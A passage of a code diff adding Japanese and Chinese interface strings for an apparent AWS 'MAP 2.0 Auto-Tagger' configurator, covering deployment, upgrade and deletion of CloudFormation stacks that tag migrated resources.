+            ui_delete_info:'このツールはアカウントから MAP Auto-Tagger デプロイを削除します。シングルアカウントのスタックとマルチアカウントの StackSet を自動検出する delete.sh スクリプトを生成します。デフォルトでは、選択したリージョン内のすべての map-auto-tagger-mig* デプロイが削除されます。既にタグ付けされたリソースの map-migrated タグは削除されないため、MAP クレジットはそのまま維持されます。',
+            ui_delete_step1_title:'デプロイ詳細',
+            ui_delete_step1_subtitle:'削除するリージョンを選択してください',
+            ui_delete_scope_title:'特定の MAP エンゲージメント(MPE)に制限',
+            ui_delete_scope_desc:'チェックしない場合、このリージョン内で見つかったすべての MAP Auto-Tagger デプロイ(map-auto-tagger-mig* に一致するスタックおよびスタックセット)が削除されます。',
+            ui_delete_scope_all:'このリージョン内のすべての map-auto-tagger-mig* デプロイ',
+            ui_delete_scope_specific:'特定の MPE',
+            ui_delete_mpe_label:'削除する MPE ID',
+            ui_delete_mpe_hint:'— 各 MPE はこのリージョンにデプロイされた MAP Auto-Tagger と一致する必要があります',
+            ui_delete_add_mpe:'+ 別の MPE を追加',
+            err_delete_mpe:'MAP エンゲージメント ID は大文字英字 (A–Z) と数字 (0–9) のみで、正確に 10 文字、かつ少なくとも 1 文字と 1 数字を含む必要があります',
+            ui_delete_optin_title:'オプション — CloudWatch ロググループ',
+            ui_delete_optin_logs:'CloudWatch ロググループを削除',
+            ui_delete_optin_logs_hint:'— 監査履歴が削除されます。デフォルトではログは保持されます。',
+            ui_delete_optin_bucket:'S3 ステージングバケット',
+            ui_delete_bucket_conditional:'他のデプロイが残っていない場合のみ削除',
+            ui_delete_bucket_yes:'はい — デプロイは残りません',
+            ui_delete_bucket_note:'S3 ステージングバケットは自動的に処理されます: アカウントに他の MAP Auto-Tagger デプロイが残っていない場合にのみ削除されます。',
+            ui_delete_review_subtitle:'削除される内容を確認してください',
+            ui_delete_confirm_title:'⚠️ 確認のため DELETE と入力してください',
+            ui_delete_confirm_hint:'このアクションは CloudFormation リソースを削除します。AWS リソースの既存の map-migrated タグは保持されますが、Lambda は新しいリソースのタグ付けを直ちに停止します。',
+            ui_delete_confirm_label:'確認のため DELETE と入力してください',
+            err_delete_confirm:'続行するには "DELETE" と入力してください',
+            ui_delete_generate:'delete.sh を生成 →',
+            ui_delete_download:'⬇ delete.sh をダウンロード',
+            ui_delete_step3_subtitle:'デプロイが実施されたアカウントの AWS CloudShell で実行してください',
+            d_instr_title:'削除手順 — MAP Auto-Tagger',
+            d_instr_region_label:'リージョン:',
+            d_instr_scope_label:'スコープ:',
+            d_instr_version_label:'テンプレートバージョン:',
+            d_instr_scope_specific:'MPE —',
+            d_instr_scope_all:'このリージョン内のすべての MAP Auto-Tagger デプロイ',
+            d_instr_opt1:'オプション 1: AWS CloudShell (推奨)',
+            d_instr_opt1_step1:'1. デプロイが実施されたアカウントの AWS コンソールにログインします。\n   (マルチアカウントデプロイの場合は管理アカウントです。)',
+            d_instr_opt1_step2:'2. CloudShell を開きます。',
+            d_instr_opt1_step3:'3. delete.sh をアップロードして実行します:',
+            d_instr_opt2:'オプション 2: ローカル AWS CLI',
+            d_instr_opt2_step1:'1. AWS CLI v2 がインストールされ、管理者資格情報で構成されていることを確認します。',
+            d_instr_opt2_step2:'2. 実行: bash delete.sh',
+            d_instr_what_title:'スクリプトの動作:',
+            d_instr_what_scoped:'リストされた各 MPE のスタックまたはスタックセットを検索して削除します。',
+            d_instr_what_all:'リージョン内のすべての map-auto-tagger-mig* スタックおよびスタックセットを列挙して削除します。',
+            d_instr_what_stackset:'スタックセットの場合: スタックインスタンスを並列で削除 (100% 許容値) した後、スタックセットを削除します。',
+            d_instr_what_stack:'スタックの場合: delete-stack を実行し、完了を待ちます。',
+            d_instr_what_bucket:'リージョンに MAP Auto-Tagger デプロイが残っていない場合のみ、S3 ステージングバケットを削除します。残っている場合は、兄弟デプロイを壊さないよう保持されます。',
+            d_instr_logs_delete:'一致する CloudWatch ロググループを削除します。',
+            d_instr_logs_preserve:'CloudWatch ロググループ (監査履歴は保持されます)。',
+            d_instr_preserved_title:'保持 (削除されません):',
+            d_instr_preserved_tags:'AWS リソースの map-migrated タグ (MAP クレジットはそのまま維持)。',
+            d_instr_preserved_iam:'スタックセット管理者および実行 IAM ロール (共有組織スキャフォールディング)。',
+            d_instr_idempotent:'冪等性: 再実行しても安全です。不足しているリソースは失敗ではなくスキップとして報告されます。',
+            ui_version_history_title:'バージョン履歴 — 何が変わりましたか？',
+            ui_version_released:'リリース日',
+            ui_version_current:'現在のターゲット',
+            ui_version_full_changelog:'GitHub の完全な変更履歴',
+            ui_version_tag_bugfix:'バグ修正',
+            ui_version_tag_coverage:'新規対応',
+            ui_version_tag_breaking:'破壊的変更',
+            ui_version_tag_security:'セキュリティ',
+            ui_version_tag_perf:'パフォーマンス',
+            ui_version_tag_other:'その他',
+            ui_editor_back:'← 戻る',
+            ui_editor_review:'確認 →',
+            ui_editor_review_title:'設定の確認',
+            ui_editor_review_subtitle:'更新スクリプトを生成する前に設定を確認してください',
+            ui_editor_review_accounts:'アカウント',
+            ui_editor_confirm_text:'指定されたMPE IDと選択したリージョンにMAP Auto-Taggerがすでにデプロイされており、両方の値が正しいことを確認します。',
+            ui_editor_confirm_risk:'誤った情報でこのスクリプトを生成・実行すると、誤ったStackSetが更新されたり、アカウントスコープが破損したり、リソースに誤ったMAP参与IDがタグ付けされる可能性があります — これによるMAPクレジットの損失は遡って回復できません。',
+            err_editor_confirm:'更新スクリプトを生成する前に確認が必要です',
+            ui_editor_generate:'update.shを生成 →',
+            ui_editor_step3_title:'スクリプト準備完了',
+            ui_editor_step3_subtitle:'管理アカウントのAWS CloudShellで実行してください',
+            ui_editor_download:'⬇ update.shをダウンロード',
+            ui_editor_script_preview:'スクリプトプレビュー',
+            err_date_required:'契約開始日を入力してください',
+            err_date_end:'契約終了日は開始日より後である必要があります',
+            err_vpc_required:'VPC IDを1つ以上入力してください。',
+            err_vpc_format:'VPC IDの形式が無効です。vpc-の後に8〜17文字の16進数が必要です（例：vpc-0abc1234def56789）。',
+            err_duplicate_vpc:'重複するVPC IDがあります。重複を削除してください。',
+            err_central_account_required:'中央アカウントID（12桁）を入力してください。',
+            d_title:'MAP 2.0 自動タガー セットアップ',
+            d_tag_label:'タグ値', d_region_label:'リージョン', d_account_label:'アカウント',
+            d_step1:'ステップ1/3：アカウントを確認しています...',
+            d_step2:'ステップ2/3：自動タガーを設定しています...',
+            d_step2_wait:'（通常1〜2分かかります）',
+            d_step2_wait_multi:'（通常10〜15分かかります）',
+            d_step3:'ステップ3/3：デプロイメントレポートを保存しています...',
+            d_ok_creds:'AWSアカウントに正常に接続されました。',
+            d_fail_creds:'AWSアカウントに接続できません。',
+            d_fix_creds:'セッションの有効期限が切れている可能性があります。AWS CloudShellを閉じて再度開き、スクリプトを実行してください。',
+            d_ok_trail:'アクティビティログが有効です：',
+            d_fail_trail:'アクティビティログ（CloudTrail）が有効になっていません：',
+            d_fix_trail1:'AWSコンソール → CloudTrail → トレイルの作成に移動してください。',
+            d_fix_trail2:'次のリージョンを含める必要があります：',
+            d_ok_perms:'デプロイメント権限が設定されています。',
+            d_fail_perms:'アカウントに必要なデプロイメント権限がありません。',
+            d_fix_perms:'AWS管理者にAWS CloudFormation、IAM、AWS Lambda、Amazon EventBridge、AWS Systems Manager、Amazon SNS、Amazon SQS、Amazon CloudWatchの権限付与を依頼してください。',
+            d_ok_org:'正しいアカウント（管理アカウントまたは委任管理者）から実行しています。',
+            d_ok_org_delegated:'CloudFormation StackSetsの委任管理者として実行しています。',
+            d_fail_org:'このスクリプトは組織の管理アカウントまたはCloudFormation StackSetsの委任管理者アカウントから実行する必要があります。',
+            d_fix_org:'AWS CloudShellを管理アカウント（または委任管理者アカウント）に切り替えてスクリプトを再実行してください。不明な場合はAWSアカウントチームにお問い合わせください。',
+            d_warn_stacksets:'マルチアカウントデプロイ連携がまだ有効になっていません — デプロイ中に自動的に設定されます。',
+            d_ok_stacksets:'マルチアカウントデプロイ連携が有効です。',
+            d_ok_scp:'タグサービスをブロックするセキュリティポリシーはありません。',
+            d_ok_vpc:'このアカウントにVPCが存在します：',
+            d_fail_vpc:'このアカウント/リージョンでVPCが見つかりません：',
+            d_fix_vpc:'VPC IDが正しく、対象アカウントとリージョンに存在することを確認してください。',
+            d_ok_account_scope:'組織にアカウントが存在します：',
+            d_fail_account_scope:'組織でアカウントが見つかりません：',
+            d_fix_account_scope:'アカウントIDが組織に属する有効な12桁のアカウントであることを確認してください。',
+            d_fail_scp:'組織のセキュリティポリシーがタグサービスをブロックしています。',
+            d_fix_scp:"AWSセキュリティチームに連絡し、Lambda実行ロールに'tag:TagResources'アクションを許可するよう依頼してください。",
+            d_scp_note:"（注：組織がリソース作成時にタグを要求する場合、セキュリティチームに'map-migrated'タグキーの除外を依頼してください。）",
+            d_all_passed:'すべての確認が完了しました。',
+            d_checks_failed:'件の確認が失敗しました。上記の手順に従ってスクリプトを再実行してください。',
+            d_fix_label:'→ 解決方法：',
+            d_deploying:'デプロイが実行中です。Ctrl+Cを押しても安全です — バックグラウンドで継続されます。',
+            d_still_deploying:'セットアップ中...',
+            d_elapsed:'経過',
+            d_deploy_failed:'セットアップに失敗しました。以下のレポートをAWSアカウントチームと共有してください。',
+            d_complete_title:'設定完了！',
+            d_complete_single:'新しいリソースは作成後1〜2分以内に自動的にタグ付けされます（最大15分かかる場合があります）。',
+            d_complete_multi:'組織のすべてのアカウントで自動タグ付けが有効になりました。',
+            d_backfill_msg:'バックフィルはまもなく実行されます。',
+            d_backfill_waiting:'バックフィルの完了を待っています...',
+            d_backfill_wait_info:'（バックフィルはまもなく開始され、最大15分かかる場合があります）',
+            d_backfill_starting:'バックフィルが実行中です...',
+            d_backfill_in_progress:'バックフィル進行中...',
+            d_backfill_timeout:'バックフィルはまだ実行中です。レポートが保存されました — 最終結果はCloudWatchで確認してください:  aws logs tail /aws/lambda/map-auto-tagger-backfill',
+            d_backfill_done:'バックフィル完了。',
+            r_backfill_result:'バックフィル結果',
+            d_backfill_since:'次の日付以降に作成された既存のリソースにタグを付けます：',
+            d_report_saved:'デプロイメントレポートの保存先：',
+            d_share_report:'このファイルをAWSアカウントチームと共有してください。',
+            r_title:'MAP 2.0 自動タガー — デプロイメントレポート',
+            r_customer:'顧客', r_mpe:'MPE ID', r_region:'リージョン', r_account:'アカウント',
+            r_date:'日時', r_result:'結果',
+            r_preflight:'事前確認結果：',
+            r_deployed:'デプロイされた内容：',
+            r_verify:'確認方法：',
+            r_backfill:'バックフィル状態：',
+            r_perstatus:'アカウント別ステータス：',
+            r_support:'サポート：',
+            r_action:'必要なアクション：',
+            r_verify1:'1. AWSアカウントで任意のリソースを作成してください',
+            r_verify2:'2. 1〜2分待ってください（混雑時は最大15分）',
+            r_verify3:'3. リソースに次のタグがあることを確認してください：map-migrated =',
+            r_share_help:'サポートが必要な場合は、このレポートをAWSアカウントチームと共有してください。',
+            r_contact:'サポートが必要な場合は、AWSアカウントチームにお問い合わせください。',
+            r_action_desc:'上記の失敗した項目を解決してからdeploy.shを再実行してください。'
+          },
+          zh: {
+            ui_title:'MAP 2.0 Auto-Tagger Configurator',
+            ui_btn_download:'下载',
+                        ui_instr_opt1_title:'选项1: AWS CloudShell（推荐）',
+            ui_instr_opt2_title:'选项2: 本地 AWS CLI',
+            ui_instr_cli_prereq_single:'确保已安装AWS CLI v2并使用迁移账户凭据进行配置。',
+            ui_instr_cli_prereq_multi:'确保已安装AWS CLI v2并使用管理账户凭据进行配置。',
+            ui_instr_cli_download:'将deploy.sh下载到您的计算机。',
+            ui_instr_cli_download_all:'将全部3个文件下载到您的计算机。',
+            ui_instr_cli_terminal:'打开终端（Linux/macOS）或WSL/Git Bash（Windows）',
+            ui_cli_alt_short:'为该账户配置AWS CLI并运行:',
+            ui_instr_single_title:'部署说明 — 单账户',
+ui_instr_single_title:'部署说明 — 单账户',
+            ui_instr_multi_title:'部署说明 — 多账户',
+            ui_instr_login_single:'登录迁移账户的AWS控制台。',
+            ui_instr_login_multi:'登录管理账户的AWS控制台。',
+            ui_instr_open_cloudshell:'打开CloudShell（单击顶部菜单栏中的终端图标）。',
+            ui_instr_upload_files:'上传文件（CloudShell → 操作 → 上传文件）:',
+            ui_instr_upload_all:'上传全部3个文件（CloudShell → 操作 → 上传文件）:',
+            ui_instr_run:'运行:',
+            ui_instr_done_single:'完成。脚本将部署并在完成时确认。',
+            ui_instr_done_multi:'完成。所有账户的自动标记现已激活。',
+            ui_instr_verify_title:'验证标记是否正常（部署后）:',
+            ui_instr_expected:'预期结果',
+            ui_instr_thats_it:'就这些。140多种支持的资源类型的自动标记已激活。',
+            ui_instr_existing_only:'现有资源不受影响 — 仅适用于新创建的资源。',
+            ui_instr_auto_handles:'脚本自动处理所有事项:',
+            ui_instr_uploads_s3:'将模板上传到S3',
+            ui_instr_enables_stacksets:'在您的组织中启用StackSets',
+            ui_instr_discovers_org:'自动发现组织结构',
+            ui_instr_deploys_all:'部署到所有账户（约10分钟）',
+            ui_instr_check_status:'运行后检查状态',
+            ui_instr_files_received:'您收到了3个文件',
+            ui_instr_target_accounts:'目标账户',
+            ui_instr_all_accounts:'（未指定账户）',
+            ui_instr_all_org:'组织中的所有账户',
+            ui_instr_cloudtrail_note:'注意：每个账户和目标区域都必须启用CloudTrail。',
+            ui_sample_notice_title:'示例代码说明:',
+            ui_sample_notice_body:"这是用于非生产环境的示例代码。在部署前，您有责任对此解决方案进行测试、安全加固和优化，以满足您组织的安全、合规要求。部署此解决方案可能会产生AWS Lambda、Amazon EventBridge、Amazon CloudWatch、Amazon SNS、Amazon SQS、AWS Systems Manager的AWS费用。请参阅:",
+            ui_shared_responsibility:'AWS责任共担模型',
+            ui_btn_copy:'复制说明',
+            ui_one_file_step:'一个文件。一个步骤。',
+            ui_send_script:'将',
+            ui_to_customer:'发送给客户。',
+            ui_cloudshell_open:'客户在',
+            ui_in_account:'中',
+            ui_upload_and_run:'打开AWS CloudShell，上传此文件并运行:',
+            ui_mgmt_account:'管理账户',
+            ui_migration_account_label:'迁移账户',
+            d_log_pass:'成功:',
+            d_log_fail:'失败:',
+            d_log_warn:'警告:',
+            ui_main_desc1:'生成CloudFormation模板，自动为新AWS资源打标签',
+            ui_main_desc2:'，通常在创建后',
+            ui_main_desc3:'60–90秒内完成（高负载时最长15分钟）',
+            ui_main_desc4:'。',
+            ui_main_desc5:'覆盖',
+            ui_main_desc6:'种以上资源类型（所有主要AWS服务，CT org E2E测试通过）。',
+            ui_main_desc7:'客户费用:',
+            ui_step1:'1. 配置', ui_step2:'2. 审核', ui_step3:'3. 下载',
+            ui_card_deal_title:'MAP 2.0 协议信息',
+            ui_card_deal_subtitle:'请输入AWS Investments提供的MAP协议信息',
+            ui_customer_name:'客户名称', ui_customer_name_hint:'（仅用于生成文件名）',
+            ui_customer_name_placeholder:'例如：ABC公司',
+            ui_mpe_tag:'MAP 参与ID',
+            ui_mpe_hint:'(来自AWS Investments的10位字母数字代码 — 例如: A1B2C3D4E5)',
+            ui_agree_start:'协议开始日期', ui_agree_start_hint:'（开始对MAP 2.0资源打标签的日期）',
+            ui_agree_end:'协议结束日期', ui_agree_end_hint:'（停止对新建资源打标签的日期）',
+            ui_alert_email:'告警邮件', ui_alert_email_hint:'（可选 — 接收标签错误通知的邮箱）',
+            ui_alert_email_missing_warn:'⚠️ 未设置告警邮件。标记失败（IAM拒绝、标签配额、服务漂移）将被静默丢弃 — 没有SNS，也没有DLQ告警目的地。您可以稍后通过 scripts/add_subscriber.sh 或重新运行 configurator 添加订阅者。\n\n是否在没有告警订阅者的情况下继续？',
+            ui_email_confirm_hint:'部署后，客户必须确认AWS订阅确认邮件。',
+            ui_deploy_mode:'部署模式', ui_deploy_mode_subtitle:'请选择用于迁移的AWS账户数量',
+            ui_single_title:'单账户', ui_single_desc:'将工作负载部署到一个AWS账户。约2分钟完成。',
+            ui_multi_title:'多账户 (AWS Organizations)', ui_multi_desc:'通过StackSet同时部署到AWS组织中的所有账户。',
+            ui_backfill_title:'一次性回填', ui_optional:'（可选）',
+            ui_coverage_title:'标签覆盖范围',
+            ui_btn_next:'下一步：审核 →', ui_btn_back:'← 返回', ui_btn_generate:'生成并下载 →',
+            ui_tagging_scope:'标签范围', ui_vpc_scope_hint:'默认情况下，账户中所有新资源都会被打标签。如果迁移和非迁移工作负载共享同一账户，请使用VPC范围限制。',
+            ui_vpc_limit:'仅限特定VPC的资源打标签',
+            ui_tag_non_vpc:'同时对非VPC资源打标签（S3、DynamoDB、Lambda、SNS、SQS等）',
+            ui_tag_non_vpc_hint:'这些服务没有VPC关联。建议无论VPC范围如何都对其打标签，以确保MAP资格。',
+            ui_vpc_ids:'VPC ID', ui_vpc_ids_hint:'（仅对这些VPC中的VPC绑定资源打标签）',
+            ui_add_vpc:'+ 添加VPC', ui_add_account:'+ 添加账户', ui_add_region:'+ 添加区域',
+            ui_migration_account_ids:'迁移账户ID', ui_migration_account_ids_hint:'（仅供参考 — 堆栈会自动部署到整个组织）',
+            ui_stackset_note:'Lambda通过根OU部署到组织中的每个账户。默认情况下，所有账户的资源都会被打标签。您也可以选择将打标签限制在特定账户。',
+            ui_stackset_bucket_note:'此部署将创建一个临时S3存储桶（auto-map-tagger-{account-id}）来暂存StackSet的CloudFormation模板。由于StackSet需要该存储桶向未来加入组织的新账户进行部署，因此部署后将保留该存储桶。',
+            ui_account_limit:'仅限特定账户打标签',
+            err_account_scope_required:'请至少输入一个账户ID。',
+            err_account_format:'账户ID无效。必须恰好为12位数字。',
+            err_duplicate_account:'检测到重复的账户ID，请删除重复项。',
+            ui_central_account_id:'中央账户ID', ui_central_account_id_hint:'（Lambda将部署到的账户）',
+            ui_member_accounts:'MAP范围内的成员账户',
+            ui_deployment_regions:'部署区域', ui_deployment_regions_hint:'（客户创建资源的区域）',
+            ui_backfill_strong:'对协议开始日期后创建的现有资源打标签',
+            ui_backfill_scope_note:'✓ 范围已应用：回填将遵循上方选择的VPC/账户范围设置。',
+            ui_backfill_desc:'部署一个一次性Lambda，从协议开始日期查询CloudTrail历史，并对在此解决方案部署之前创建的所有匹配资源打标签。部署后约5分钟自动运行。',
+            ui_backfill_note:'注意：CloudTrail历史记录限于最近90天。在此时间窗口之前创建的资源需要手动打标签。',
+            ui_coverage_subtitle:'通过多账户CT组织测试验证的140+资源类型（4个账户 × 4个区域）',
+            ui_review_title:'配置审核', ui_review_subtitle:'生成模板前请验证设置',
+            ui_what_deployed:'将要部署的内容',
+            ui_template_ready:'模板已就绪', ui_template_ready_subtitle:'请连同以下部署说明一起分享给客户',
+            ui_prereq_title:'客户前提条件', ui_prereq_subtitle:'生成的deploy.sh将在部署前自动验证：',
+            ui_prereq_cloudtrail:'目标区域中必须启用CloudTrail',
+            ui_prereq_perms:'部署者必须拥有AWS CloudFormation权限（IAM、AWS Lambda、Amazon EventBridge、AWS Systems Manager、Amazon SNS、Amazon SQS、Amazon CloudWatch）',
+            ui_prereq_org:'管理账户必须启用AWS Organizations和CloudFormation StackSets受信任访问',
+            ui_scp_title:'⚠️ 服务控制策略（SCP）提示',
+            ui_scp_intro:'如果客户的组织使用了SCP，请在部署前验证以下内容：',
+            ui_deploy_instructions:'客户部署说明',
+            ui_template_preview:'模板预览', ui_download_template:'下载 CloudFormation 模板', ui_download_template_note:'可选 — 适用于希望在部署前查看 CloudFormation 代码的客户。', ui_start_over:'重新开始',
+            ui_cost_note:'预计每月费用：', ui_cost_note2:'/ 账户（Lambda调用 + CloudWatch）。无需AWS Config。',
+            ui_scp_tagging:'标签SCP — 确保SCP不拒绝Lambda执行角色的tag:TagResources、ec2:CreateTags或其他标签操作。deploy.sh将运行部署后IAM模拟检查，但SCP需要在AWS Organizations控制台中手动验证。',
+            ui_scp_mandatory:'强制标签SCP — 如果SCP要求在资源创建时必须存在标签，此解决方案将无法满足该要求（标签在创建后60-90秒应用）。客户必须豁免map-migrated标签键或设置宽限期。',
+            rv_not_specified:'(未指定)', rv_none:'(无)', rv_none_specified:'(未指定)',
+            rv_yes:'是', rv_no:'否', rv_disabled:'已禁用', rv_enabled:'已启用',
+            rv_multi_method:'多账户方法', rv_stackset:'StackSet（每账户Lambda）', rv_central:'中央Lambda（跨账户）',
+            rv_target_accounts:'目标账户', rv_tag_non_vpc:'标记非VPC服务',
+            rv_all_resources:'目标账户中的所有资源',
+            rv_backfill_enabled:'已启用 — 标记协议开始日期后的现有资源（部署后约5分钟）',
+            rv_desc_single:'一个CloudFormation堆栈。直接在客户账户中部署：',
+            rv_desc_stackset:'生成两个文件。部署一次管理账户模板 — 自动发现组织结构并配置指定账户：',
+            rv_desc_central:'一个账户中的中央Lambda + 每个成员账户中的跨账户IAM角色：',
+            rv_deploy_mgmt:'部署到管理账户', rv_deploy_accounts:'上传到S3，部署到每个账户',
+            rv_targets:'目标', rv_specific_accounts:'个特定账户', rv_targets_all:'目标为组织中的所有账户',
+            rv_res_lambda:'AWS Lambda函数', rv_res_lambda_desc:'在创建后60-90秒内自动为新资源打标签',
+            rv_res_eventbridge:'Amazon EventBridge规则', rv_res_eventbridge_desc:'捕获所有服务中200+个Create/Run/Put/Publish事件',
+            rv_res_ssm:'AWS Systems Manager参数', rv_res_ssm_desc:'存储MAP ID、协议日期、范围配置',
+            rv_res_iam:'IAM角色', rv_res_iam_desc:'100+个服务特定标签权限，最小权限原则',
+            rv_res_dlq:'Amazon SQS死信队列', rv_res_dlq_desc:'捕获失败的标签事件以供重试/审计',
+            rv_res_sns:'Amazon SNS主题 + Amazon CloudWatch告警', rv_res_sns_desc:'标签错误时发出通知（5分钟内超过3次失败）',
+            rv_res_custom:'自定义资源（Lambda）', rv_res_custom_desc:'部署时自动发现根OU ID — 客户无需操作',
+            err_mpe_invalid:"MAP参与ID必须恰好为10个字符，仅限英文大写字母(A–Z)和数字(0–9)，且至少包含一个字母和一个数字",
+            ui_landing_title:'您想做什么？',
+            ui_landing_subtitle:'选择一个选项开始',
+            ui_mode_deploy_title:'部署新的MAP Auto-Tagger',
+            ui_mode_deploy_desc:'为新的MAP 2.0项目生成部署脚本。支持单账户和多账户（AWS Organizations）部署。',
+            ui_mode_edit_title:'编辑现有部署',
+            ui_mode_edit_desc:'在已部署的MAP Auto-Tagger范围内添加或删除AWS账户。无需完全重新部署，生成更新脚本。',
+            ui_mode_edit_note:'仅限多账户（AWS Organizations）部署',
+            ui_estep1:'1. 配置', ui_estep2:'2. 审核', ui_estep3:'3. 下载',
+            ui_editor_info:'此工具修改由MAP Auto-Tagger Configurator创建的现有部署。它生成一个update.sh脚本，无需重新部署即可更新账户范围。',
+            ui_editor_step1_title:'部署详情',
+            ui_editor_step1_subtitle:'输入您现有MAP Auto-Tagger部署的详细信息',
+            ui_editor_mpe_hint:'— 必须与原始部署匹配的10位字母数字代码',
+            ui_editor_region:'部署区域',
+            ui_editor_region_hint:'— 管理堆栈部署所在的区域',
+            ui_editor_region_placeholder:'选择区域...',
+            err_editor_region:'请选择部署区域',
+            ui_editor_action_title:'操作',
+            ui_editor_action_subtitle:'选择是添加还是从MAP范围中删除账户',
+            ui_editor_add_title:'将账户添加到MAP范围',
+            ui_editor_add_desc:'选定的账户将开始使用MAP标签进行标记。',
+            ui_editor_add_accounts_label:'要添加的账户ID',
+            ui_editor_add_accounts_hint:'— 仅限当前不在范围内的账户',
+            err_editor_account:'请输入至少一个有效的12位账户ID',
+            ui_editor_backfill_title:'为新添加的账户重新运行回填',
+            ui_editor_backfill_desc:'从协议开始日期查询CloudTrail历史记录，并为新添加账户中的现有资源打标签。在StackSet更新期间自动运行。结果显示在CloudWatch Logs（map-auto-tagger-backfill）中。',
+            ui_editor_backfill_note:'注意：CloudTrail历史记录限于最近90天。之前创建的资源需要手动打标签。',
+            ui_editor_remove_title:'从MAP范围中删除账户',
+            ui_editor_remove_desc:'选定的账户将停止被标记。现有标签不会被删除。Lambda在这些账户中保持部署但处于非活动状态。',
+            ui_editor_remove_accounts_label:'要删除的账户ID',
+            ui_editor_remove_accounts_hint:'— 仅限当前在范围内的账户',
+            ui_mode_update_title:'升级到最新模板版本',
+            ui_mode_update_desc:'将 Lambda 代码、IAM 策略和 EventBridge 规则升级到当前模板版本。范围配置（账户、VPC、协议日期）将被保留。自动检测单账户和多账户部署。',
+            ui_ustep1:'1. 配置',
+            ui_ustep2:'2. 审核',
+            ui_ustep3:'3. 下载',
+            ui_update_info:'此工具将现有的 MAP Auto-Tagger 部署升级到最新模板版本。它生成一个 <code>update.sh</code> 脚本，保留范围配置并自动检测单账户和多账户部署。',
+            ui_update_step1_title:'部署详情',
+            ui_update_step1_subtitle:'输入升级的区域和可选范围',
+            ui_update_info_detail:'生成的 <code>update.sh</code> 从 SSM 参数存储（<code>/auto-map-tagger/&lt;mpe&gt;/version</code>）读取当前模板版本，与目标版本进行比较，并在没有 <code>--force</code> 的情况下拒绝跨主版本升级（例如 v19 → v21）。根据 SemVer，仅 MAJOR 升级需要客户操作。',
+            ui_update_scope_title:'仅升级特定的 MAP 项目',
+            ui_update_scope_desc:'不勾选则升级此账户中脚本找到的所有 MAP Auto-Tagger 部署（与 <code>map-auto-tagger-mig*</code> 匹配的所有堆栈和堆栈集）。',
+            ui_update_mpe_label:'要升级的 MPE ID',
+            ui_update_mpe_hint:'— 每个 MPE 必须与此区域中已部署的 MAP Auto-Tagger 匹配',
+            ui_update_add_mpe:'+ 添加另一个 MPE',
+            err_update_mpe:'请输入至少一个有效的 10 位 MPE ID',
+            ui_update_scope_review:'升级范围',
+            ui_update_all_review:'此账户中所有 MAP Auto-Tagger 部署',
+            ui_update_target_version:'目标模板版本',
+            ui_update_confirm_text:'我确认所列的 MAP Auto-Tagger 部署存在于所选区域，并且升级到目标模板版本是预期操作。',
+            ui_update_confirm_risk:'升级会替换每个匹配堆栈中的 Lambda 代码、IAM 策略和 EventBridge 规则。通过 <code>--use-previous-parameters</code> 保留范围和协议日期，但失败的部署可能会使堆栈处于 UPDATE_ROLLBACK_COMPLETE 状态，需要手动恢复。',
+            err_update_confirm:'必须在生成升级脚本之前确认',
+            ui_update_step3_subtitle:'在已部署账户的 AWS CloudShell 中运行',
+            ui_mode_delete_title:'删除现有部署',
+            ui_mode_delete_desc:'从账户中移除 MAP Auto-Tagger 部署。默认删除该区域中所有 map-auto-tagger-mig* 堆栈和堆栈集；可选择限定到特定 MPE。已标记资源上的 map-migrated 标签不会被移除。',
+            ui_dstep1:'1. 配置',
+            ui_dstep2:'2. 检查',
+            ui_dstep3:'3. 下载',
+            ui_delete_info:'此工具从您的账户中移除 MAP Auto-Tagger 部署。它会生成一个 delete.sh 脚本，自动检测单账户堆栈和多账户 StackSet。默认情况下，选定区域内的所有 map-auto-tagger-mig* 部署都会被移除。已标记资源上的 map-migrated 标签不会被移除——这些标签将保留，以便 MAP 积分保持完整。',
+            ui_delete_step1_title:'部署详情',
+            ui_delete_step1_subtitle:'选择要删除的区域',
+            ui_delete_scope_title:'限定到特定 MAP 参与项目(MPE)',
+            ui_delete_scope_desc:'不勾选时，将删除此区域内发现的所有 MAP Auto-Tagger 部署（匹配 map-auto-tagger-mig* 的堆栈和堆栈集）。',
+            ui_delete_scope_all:'此区域中的所有 map-auto-tagger-mig* 部署',
+            ui_delete_scope_specific:'特定 MPE',
+            ui_delete_mpe_label:'要删除的 MPE ID',
+            ui_delete_mpe_hint:'— 每个 MPE 必须与此区域中已部署的 MAP Auto-Tagger 相匹配',
+            ui_delete_add_mpe:'+ 添加另一个 MPE',
+            err_delete_mpe:'MAP 参与 ID 必须正好是 10 个字符，仅限大写英文字母（A–Z）和数字（0–9），且至少包含一个字母和一个数字',
+            ui_delete_optin_title:'可选 — CloudWatch 日志组',
+            ui_delete_optin_logs:'删除 CloudWatch 日志组',
+            ui_delete_optin_logs_hint:'— 移除审计历史。默认保留日志。',
+            ui_delete_optin_bucket:'S3 暂存存储桶',
+            ui_delete_bucket_conditional:'仅当不再有其他部署时才删除',
+            ui_delete_bucket_yes:'是 — 将没有剩余部署',
+            ui_delete_bucket_note:'S3 暂存存储桶将自动处理：仅当账户中不再有其他 MAP Auto-Tagger 部署时才删除。',
+            ui_delete_review_subtitle:'确认将被删除的内容',
+            ui_delete_confirm_title:'⚠️ 输入 DELETE 以确认',
+            ui_delete_confirm_hint:'此操作会删除 CloudFormation 资源。AWS 资源上现有的 map-migrated 标签将被保留，但 Lambda 将立即停止标记新资源。',
+            ui_delete_confirm_label:'输入单词 DELETE 以确认',
+            err_delete_confirm:'输入"DELETE"以继续',
+            ui_delete_generate:'生成 delete.sh →',
+            ui_delete_download:'⬇ 下载 delete.sh',
+            ui_delete_step3_subtitle:'在已部署账户的 AWS CloudShell 中运行',
+            d_instr_title:'删除说明 — MAP Auto-Tagger',
+            d_instr_region_label:'区域：',
+            d_instr_scope_label:'范围：',
+            d_instr_version_label:'模板版本：',
+            d_instr_scope_specific:'MPE —',
+            d_instr_scope_all:'此区域中的所有 MAP Auto-Tagger 部署',
+            d_instr_opt1:'选项 1：AWS CloudShell（推荐）',
+            d_instr_opt1_step1:'1. 登录到执行部署的账户的 AWS 控制台。\n   （对于多账户部署，这是管理账户。）',
+            d_instr_opt1_step2:'2. 打开 CloudShell。',
+            d_instr_opt1_step3:'3. 上传 delete.sh 并运行：',
+            d_instr_opt2:'选项 2：本地 AWS CLI',
+            d_instr_opt2_step1:'1. 确保已安装 AWS CLI v2 并配置管理员凭证。',
+            d_instr_opt2_step2:'2. 运行：bash delete.sh',
+            d_instr_what_title:'脚本的作用：',
+            d_instr_what_scoped:'查找列出的每个 MPE 的堆栈或堆栈集并将其删除。',
+            d_instr_what_all:'枚举该区域中的所有 map-auto-tagger-mig* 堆栈和堆栈集并将其删除。',
